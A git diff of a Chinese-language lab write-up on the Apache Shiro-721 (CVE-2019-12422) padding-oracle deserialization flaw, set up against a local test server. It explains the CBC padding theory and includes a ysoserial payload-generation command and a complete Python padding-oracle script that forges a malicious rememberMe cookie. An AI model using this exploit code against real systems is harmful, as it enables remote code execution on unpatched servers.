@@ -187,6 +187,8 @@ print("rememberMe=" + cookie_value)
 
 shiro-721，即**CVE-2019-12422**。由于 **Apache Shiro** 的 `rememberMe` Cookie 加密实现缺陷，导致攻击者无需知晓加密密钥的情况下，通过 **Padding Oracle** 攻击构造恶意序列化数据，实现RCE。
 
+
+
 ### 前置知识
 
 #### AES算法
@@ -241,11 +243,160 @@ shiro-721，即**CVE-2019-12422**。由于 **Apache Shiro** 的 `rememberMe` Coo
 	填充字节的值等于填充的长度。解密后，服务端会检查最后一个字节的值，并验证填充是否合法。
 ```
 
+
+
 #### Padding Oracle
 
 > **Padding Oracle** 是一种针对使用 **CBC模式 + 填充校验** 的分组密码实现的测信道攻击。
 
+##### Oracle
+
+这里的 `Oracle` 指的是密码学中的 `“神谕/黑盒”` 。
+
+若服务端会对填充返回不同响应，那么攻击者便可以区分：
+
+- 填充错误 → 返回 `500`
+- 填充正确 → 返回 `200`
+- 填充错误 → 返回 `rememberMe=deleteMe`
+- 填充错误 → 响应时间不同
+
+如果攻击者能不断提交修改过的密文，并且服务端会告诉他“填充是对的”还是“填充是错的”，那就说明这里存在一个 `Padding Oracle`。
+
+
+
 ### 漏洞原理
 
+> **攻击者无需知道加密密钥，只需利用一个合法的 Cookie 作为“跳板”，就能通过 Padding Oracle 攻击，伪造出包含恶意代码的 Cookie，最终触发 Java 反序列化，实现远程代码执行（RCE）。**
 
 
+
+### 影响版本
+
+1.25 <= Apache Shiro < 1.4.2
+
+
+
+### 环境搭建
+
+```powershell
+PS D:\> git clone https://github.com/apache/shiro.git
+
+PS D:\> cd ./shiro
+
+# 恢复到受影响的版本
+PS D:\shiro> git checkout shiro-root-1.4.1
+```
+
+使用 `maven` 打包，在 `samples\web\target\` 下能找到  `samples-web-1.4.1.war`，将其打包文件放入 `Tomcat` 的 `webapps` 目录下部署运行
+
+```powershell
+PS D:\shiro> mvn clean package -pl samples/web
+```
+
+接下来的步骤就和 **shiro-550** 中的环境搭建一样了
+
+浏览器中访问，URL: http://localhost:8088/samples-web-1.4.1/
+
+![image-20260926155815060](./../images/image-20260926155815060.png)
+
+
+
+### 漏洞复现
+
+我们选择 `root` 去登录，`Burp Suite` 抓包得到一个有效的 `rememberMe` Cookie
+
+![image-20260926174849418](./../images/image-20260926174849418.png)
+
+使用 `ysoserial` 生成 `payload` 
+
+```powershell
+PS D:\shiro_payload> java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
+```
+
+利用公开的脚本去爆破 `payload` 密文
+
+```python
+#https://github.com/3ndz/Shiro-721  
+# -*- coding: utf-8 -*-  
+from paddingoracle import BadPaddingException, PaddingOracle  
+from base64 import b64encode, b64decode  
+from urllib import quote, unquote  
+import requests  
+import socket  
+import time  
+  
+class PadBuster(PaddingOracle):  
+    def __init__(self, **kwargs):  
+        super(PadBuster, self).__init__(**kwargs)  
+        self.session = requests.Session()  
+        self.wait = kwargs.get('wait', 2.0)  
+  
+    def oracle(self, data, **kwargs):  
+        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)  
+        self.session.cookies['rememberMe'] = somecookie  
+        if self.session.cookies.get('JSESSIONID'):  
+            del self.session.cookies['JSESSIONID']  
+        while 1:  
+            try:  
+                response = self.session.get(sys.argv[1],  
+                        stream=False, timeout=5, verify=False)  
+                break  
+            except (socket.error, requests.exceptions.RequestException):  
+                logging.exception('Retrying request in %.2f seconds...',  
+                                  self.wait)  
+                time.sleep(self.wait)  
+                continue  
+  
+        self.history.append(response)  
+        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):  
+            logging.debug('No padding exception raised on %r', somecookie)  
+            return  
+        raise BadPaddingException  
+  
+  
+if __name__ == '__main__':  
+    import logging  
+    import sys  
+  
+    if not sys.argv[3:]:  
+        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )  
+        sys.exit(1)  
+  
+    logging.basicConfig(level=logging.DEBUG)  
+    encrypted_cookie = b64decode(unquote(sys.argv[2]))  
+    padbuster = PadBuster()  
+    payload = open(sys.argv[3], 'rb').read()  
+    enc = padbuster.encrypt(plaintext=payload, block_size=16)  
+    print('rememberMe cookies:')  
+    print(b64encode(enc))
+```
+
+```powershell
+PS D:\shiro_payload> python .\shiro-721_attack.py http://localhost:8088/samples-web-1.4.1/ [rememberMeCookie] payload.class
+```
+
+上面这个脚本捣鼓了好久，总是跑不出来
+
+
+
+所以，摒弃上面的方法，改用工具 `ShiroExploit` 来验证了
+
+![image-20260926174939779](./../images/image-20260926174939779.png)
+
+在这里使用的是 `dnslog` 的验证方式
+
+![image-20260926175117359](./../images/image-20260926175117359.png)
+
+long long long time ........
+
+
+
+## 0x04 ~ shiro-550 与 shiro-721的区别
+
+| 对比项                  | Shiro550 (CVE-2016-4437)  | Shiro721 (CVE-2019-12422)                |
+| :---------------------- | :------------------------ | :--------------------------------------- |
+| **漏洞类型**            | 硬编码密钥 + 反序列化     | Padding Oracle + 反序列化                |
+| **影响版本**            | **Shiro** **< 1.2.5**     | **Shiro** **1.2.5 ~ 1.4.1**              |
+| **是否需要合法 Cookie** | **不需要**                | **必须有一个合法的 `rememberMe` Cookie** |
+| **密钥**                | 使用默认硬编码的 AES 密钥 | 密钥随机生成，攻击者不知道               |
+| **利用难度**            | 低，直接构造 Cookie       | 高，需要 Padding Oracle 逐字节爆破       |
